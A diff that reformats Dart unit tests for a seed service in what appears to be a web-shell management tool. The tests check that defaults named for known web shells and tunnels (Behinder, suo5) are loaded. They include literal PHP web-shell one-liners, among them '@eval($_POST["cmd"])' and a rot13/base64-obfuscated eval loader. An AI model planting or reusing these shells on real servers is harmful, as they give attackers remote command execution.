@@ -65,23 +65,26 @@ void main() {
   TestWidgetsFlutterBinding.ensureInitialized();
 
   group('SeedService', () {
-    test('first seed inserts defaults and writes current seed version', () async {
-      final db = _MemoryDb();
+    test(
+      'first seed inserts defaults and writes current seed version',
+      () async {
+        final db = _MemoryDb();
 
-      await SeedService.seed(db);
+        await SeedService.seed(db);
 
-      final payloads = await db.getAllPayloads();
-      expect(payloads, isNotEmpty);
-      expect(payloads.length, equals(25));
-      expect(payloads.map((p) => p.name), contains('php_eval_post.php'));
-      expect(payloads.map((p) => p.name), contains('jsp_behinder.jsp'));
-      expect(payloads.map((p) => p.name), contains('aspx_cmd_post.aspx'));
-      expect(payloads.map((p) => p.name), contains('suo5.php'));
-      expect(payloads.map((p) => p.name), contains('suo5.jsp'));
-      expect(payloads.map((p) => p.name), contains('suo5.aspx'));
-      expect(payloads.map((p) => p.name), contains('suo6.jsp'));
-      expect(await db.getMetaValue('seed_version'), equals('11'));
-    });
+        final payloads = await db.getAllPayloads();
+        expect(payloads, isNotEmpty);
+        expect(payloads.length, equals(25));
+        expect(payloads.map((p) => p.name), contains('php_eval_post.php'));
+        expect(payloads.map((p) => p.name), contains('jsp_behinder.jsp'));
+        expect(payloads.map((p) => p.name), contains('aspx_cmd_post.aspx'));
+        expect(payloads.map((p) => p.name), contains('suo5.php'));
+        expect(payloads.map((p) => p.name), contains('suo5.jsp'));
+        expect(payloads.map((p) => p.name), contains('suo5.aspx'));
+        expect(payloads.map((p) => p.name), contains('suo6.jsp'));
+        expect(await db.getMetaValue('seed_version'), equals('11'));
+      },
+    );
 
     test('seed is idempotent and does not create duplicate payloads', () async {
       final db = _MemoryDb();
@@ -96,41 +99,46 @@ void main() {
       expect(second.map((p) => p.name).toSet().length, equals(second.length));
     });
 
-    test('seed patch renames legacy payload and repairs b64rot13 content', () async {
-      final now = DateTime.now();
-      final db = _MemoryDb();
-      db.seedExisting(
-        Payload(
-          id: 1,
-          name: 'php_simple.php',
-          type: 'php',
-          content: r'<?php @eval($_POST["cmd"]);',
-          isDefault: true,
-          createdAt: now,
-          updatedAt: now,
-        ),
-      );
-      db.seedExisting(
-        Payload(
-          id: 2,
-          name: 'php_b64rot13_post.php',
-          type: 'php',
-          content: '<?php // broken old content',
-          isDefault: true,
-          createdAt: now,
-          updatedAt: now,
-        ),
-      );
+    test(
+      'seed patch renames legacy payload and repairs b64rot13 content',
+      () async {
+        final now = DateTime.now();
+        final db = _MemoryDb();
+        db.seedExisting(
+          Payload(
+            id: 1,
+            name: 'php_simple.php',
+            type: 'php',
+            content: r'<?php @eval($_POST["cmd"]);',
+            isDefault: true,
+            createdAt: now,
+            updatedAt: now,
+          ),
+        );
+        db.seedExisting(
+          Payload(
+            id: 2,
+            name: 'php_b64rot13_post.php',
+            type: 'php',
+            content: '<?php // broken old content',
+            isDefault: true,
+            createdAt: now,
+            updatedAt: now,
+          ),
+        );
 
-      await SeedService.seed(db);
-      final payloads = await db.getAllPayloads();
+        await SeedService.seed(db);
+        final payloads = await db.getAllPayloads();
 
-      expect(payloads.map((p) => p.name), contains('php_eval_post.php'));
+        expect(payloads.map((p) => p.name), contains('php_eval_post.php'));
 
-      final b64 = payloads.firstWhere((p) => p.name == 'php_b64rot13_post.php');
-      expect(b64.content, contains(r"$f = str_rot13('onfr64_qrpbqr');"));
-      expect(b64.content, contains(r"$q = $f($_POST['mAtrix_911']);"));
-      expect(b64.content, contains('@eval(\$q);'));
-    });
+        final b64 = payloads.firstWhere(
+          (p) => p.name == 'php_b64rot13_post.php',
+        );
+        expect(b64.content, contains(r"$f = str_rot13('onfr64_qrpbqr');"));
+        expect(b64.content, contains(r"$q = $f($_POST['mAtrix_911']);"));
+        expect(b64.content, contains('@eval(\$q);'));
+      },
+    );
   });
 }
